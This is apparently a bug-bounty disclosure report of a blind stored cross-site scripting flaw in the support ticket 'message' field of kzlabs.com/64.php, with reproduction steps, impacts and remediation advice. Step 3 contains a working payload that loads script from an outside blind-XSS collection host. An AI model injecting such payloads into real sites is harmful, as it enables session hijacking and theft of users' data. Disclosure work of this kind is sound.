## Title
Blind Cross-Site Scripting (XSS) in "message" field in new ticket page under support feature

## Summary
I found a blind cross-site scripting vulnerability in "message" field in new ticket page under support feature. There is no input validation implemented on this parameter. Attacker can inject arbitrary javascript code which gets stored in the application. Any user who acess this endpoint, the injected payload will be retrived from server and gets executed in user browser. 


## Affected URL
https://kzlabs.com/64.php


## Steps to Reproduce
1. Open the following URL in a browser https://kzlabs.com/64.php

2. Click on support and create a new ticket

3. Fill the form. Under message field enter below payload
'"><script src=https://xss.report/c/sk404></script>

4. You will not see any alert box getting triggered.

5. Since it is a Blind XSS, you can see the output in xss.report portal. 


## Proof of Concept Request

<img width="3000" height="1700" alt="image" src="https://github.com/user-attachments/assets/3d55474e-f249-40ac-bdf0-2982130b6d0e" />


## Impact
- It allows attackers to hijack user session
- It potentially leads to full account takeover
- It allows to perform  unauthorized actions within the vulnerable application
- It allows attacker to exfiltrate sensitive data


## Remediation
- User supplied input should be validated at server level.
- Use a security encoding library to encode all parameters
- Use whitelisting instead of blacklist for special charecters
- Use HTTPOnly flag. This will prevent client-side scripts from accessing cookies
- Use CSP header and avoid using eval, unsafe-inline etc directives in CSP.
- Use strong WAF like cloudflare to block malicious payloads.
